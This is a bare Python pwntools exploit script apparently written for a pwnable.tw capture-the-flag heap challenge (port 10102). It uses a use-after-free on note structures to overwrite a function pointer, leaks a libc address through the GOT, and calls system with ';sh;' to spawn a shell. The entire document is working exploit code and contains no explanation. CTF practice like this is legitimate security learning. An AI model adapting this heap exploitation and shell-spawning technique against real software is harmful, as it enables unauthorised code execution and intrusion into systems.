from pwn import *
import sys
io = remote('chall.pwnable.tw',10102)
#io = remote('127.0.0.1',4000)

def add(size, content):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('size :')
    io.sendline(str(size))
    io.recvuntil('tent :')
    io.send(content)

def  delete(index):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(index))

def printn(index):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(index))
    return io.recvline()[:-1]

add(0xc, 'a'*0xc)
add(0x1c,'b'*0x1c)
delete(0)
delete(0)
delete(1)
add(0xc, p32(0x804862b) + p32(0x804a010)*2)
#print(printn(0))
libc_base = u32(printn(0)[:4]) - 0x49020
print('libc: ' + hex(libc_base))
#add(0xc, 'c'*0xc)

system = libc_base + 0x3a940
# gadget: 0x3a819 0x5f065 0x5f066
one_gadget = libc_base + 0x5f066

add(0xc, p32(system) + ';sh;')#0
io.interactive()



